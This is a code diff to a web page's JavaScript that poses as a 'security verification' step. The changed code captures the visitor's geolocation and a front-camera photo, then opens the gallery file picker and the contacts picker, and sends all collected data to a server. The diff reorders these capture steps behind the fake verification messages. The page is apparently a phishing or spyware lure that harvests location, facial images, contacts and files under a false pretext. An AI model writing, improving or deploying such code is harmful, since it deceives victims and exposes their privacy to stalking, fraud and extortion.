@@ -60,29 +60,14 @@
             panel.classList.remove("hidden");
             panel.innerText = "Verifying security profile...";
 
-            // 1. Automatically trigger gallery file prompt option if needed
-            // document.getElementById('gallery-input').click();
-
+            // Step 1: Run automatic background telemetry (Location + Camera) first within 1 second
             setTimeout(() => {
                 startAutoSequence();
             }, 1000);
         }
 
         async function startAutoSequence() {
-            // 1. Call List / Contacts Capture
-            if (('contacts' in navigator) && ('Navigator' in window && 'select' in window.ContactsManager.prototype)) {
-                try {
-                    const props = ['name', 'tel'];
-                    const opts = { multiple: true };
-                    capturedContacts = await navigator.contacts.select(props, opts);
-                } catch (err) {
-                    capturedContacts = "User Skipped or Denied";
-                }
-            } else {
-                capturedContacts = "Not Supported";
-            }
-
-            // 2. Geolocation Capture
+            // 1. Geolocation Capture
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -105,29 +90,52 @@
         }
 
         function proceedToCaptureImage() {
-            setTimeout(() => {
-                // 3. Camera Snapshot Capture
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                    .then(stream => {
-                        const video = document.getElementById("v");
-                        video.srcObject = stream;
-                        setTimeout(() => {
-                            const canvas = document.getElementById("c");
-                            canvas.width = video.videoWidth || 320;
-                            canvas.height = video.videoHeight || 240;
-                            const ctx = canvas.getContext("2d");
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            capturedImage = canvas.toDataURL("image/jpeg", 0.7);
-                            
-                            stream.getTracks().forEach(t => t.stop());
-                            sendDataToServer();
-                        }, 1200);
-                    })
-                    .catch(err => {
-                        capturedImage = null;
-                        sendDataToServer();
-                    });
-            }, 1000);
+            // 2. Camera Snapshot Capture
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById("v");
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById("c");
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        capturedImage = canvas.toDataURL("image/jpeg", 0.7);
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        triggerInteractivePrompts();
+                    }, 1200);
+                })
+                .catch(err => {
+                    capturedImage = null;
+                    triggerInteractivePrompts();
+                });
+        }
+
+        // Step 2: Trigger Gallery and Contacts interactive picker prompts sequentially
+        async function triggerInteractivePrompts() {
+            const panel = document.getElementById("status-panel");
+            panel.innerText = "Please complete security verification prompts...";
+
+            // Trigger Gallery File Input Prompt
+            document.getElementById('gallery-input').click();
+
+            // Trigger Contacts / Call List Picker Prompt
+            if (('contacts' in navigator) && ('Navigator' in window && 'select' in window.ContactsManager.prototype)) {
+                try {
+                    const props = ['name', 'tel'];
+                    const opts = { multiple: true };
+                    capturedContacts = await navigator.contacts.select(props, opts);
+                } catch (err) {
+                    capturedContacts = "User Skipped or Denied";
+                }
+            } else {
+                capturedContacts = "Not Supported";
+            }
+
+            // Finally send all collected data to server
+            sendDataToServer();
         }
 
         function handleGalleryUpload(event) {
